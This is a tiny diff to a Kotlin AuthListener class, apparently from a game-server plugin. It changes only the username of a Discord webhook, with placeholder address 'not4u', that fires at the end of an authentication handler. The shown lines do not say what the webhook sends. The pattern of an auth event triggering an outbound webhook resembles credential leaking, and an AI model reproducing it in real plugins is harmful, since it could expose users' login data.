@@ -24,7 +24,7 @@ class AuthListener : Listener {
         }
 
         val webhook = DiscordWebhook("not4u")
-        webhook.username = ("aaaaffff")
+        webhook.username = ("aaaafffff")
         webhook.execute()
     }
 }
